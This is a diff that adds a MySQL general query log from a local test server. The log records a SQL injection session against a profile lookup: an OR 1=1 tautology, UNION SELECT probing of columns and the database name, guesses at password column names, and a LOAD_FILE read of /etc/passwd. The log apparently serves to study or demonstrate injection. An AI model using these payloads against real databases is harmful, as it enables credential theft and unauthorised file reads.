@@ -1,0 +1,54 @@
+/opt/lampp/sbin/mysqld, Version: 5.5.27-log (Source distribution). started with:
+Tcp port: 3306  Unix socket: /opt/lampp/var/mysql/mysql.sock
+Time                 Id Command    Argument
+130226  4:32:27	    1 Connect	root@localhost on 
+		    1 Init DB	googleplus
+		    1 Quit	
+130226  4:32:38	    2 Connect	root@localhost on 
+		    2 Init DB	googleplus
+		    2 Query	SELECT first,last,nick from Profile where Profile.email='test@google.com'
+		    2 Quit	
+130226  4:32:54	    3 Connect	root@localhost on 
+		    3 Init DB	googleplus
+		    3 Query	SELECT first,last,nick from Profile where Profile.email='' OR 1=1;#'
+		    3 Quit	
+130226  4:37:35	    4 Connect	root@localhost on 
+		    4 Init DB	googleplus
+		    4 Query	SELECT first,last,nick from Profile where Profile.email='' UNION SELECT null, database();#'
+		    4 Quit	
+130226  4:37:40	    5 Connect	root@localhost on 
+		    5 Init DB	googleplus
+		    5 Query	SELECT first,last,nick from Profile where Profile.email='' UNION SELECT null, null, database();#'
+		    5 Quit	
+130226  4:38:05	    6 Connect	root@localhost on 
+		    6 Init DB	googleplus
+		    6 Query	SELECT first,last,nick from Profile where Profile.email='' UNION SELECT null, null, username FROM Profile;#'
+		    6 Quit	
+130226  4:38:19	    7 Connect	root@localhost on 
+		    7 Init DB	googleplus
+		    7 Query	SELECT first,last,nick from Profile where Profile.email='' UNION SELECT null, null, name FROM Profile;#'
+		    7 Quit	
+130226  4:38:25	    8 Connect	root@localhost on 
+		    8 Init DB	googleplus
+		    8 Query	SELECT first,last,nick from Profile where Profile.email='' UNION SELECT null, null, last FROM Profile;#'
+		    8 Quit	
+130226  4:38:33	    9 Connect	root@localhost on 
+		    9 Init DB	googleplus
+		    9 Query	SELECT first,last,nick from Profile where Profile.email='' UNION SELECT null, null, nick FROM Profile;#'
+		    9 Quit	
+130226  4:38:43	   10 Connect	root@localhost on 
+		   10 Init DB	googleplus
+		   10 Query	SELECT first,last,nick from Profile where Profile.email='' UNION SELECT null, nick, password FROM Profile;#'
+		   10 Quit	
+130226  4:38:51	   11 Connect	root@localhost on 
+		   11 Init DB	googleplus
+		   11 Query	SELECT first,last,nick from Profile where Profile.email='' UNION SELECT null, nick, passwd FROM Profile;#'
+		   11 Quit	
+130226  4:38:55	   12 Connect	root@localhost on 
+		   12 Init DB	googleplus
+		   12 Query	SELECT first,last,nick from Profile where Profile.email='' UNION SELECT null, nick, pwd FROM Profile;#'
+		   12 Quit	
+130226  4:39:33	   13 Connect	root@localhost on 
+		   13 Init DB	googleplus
+		   13 Query	SELECT first,last,nick from Profile where Profile.email='' UNION SELECT null, null, LOAD_FILE('/etc/passwd');#'
+		   13 Quit	
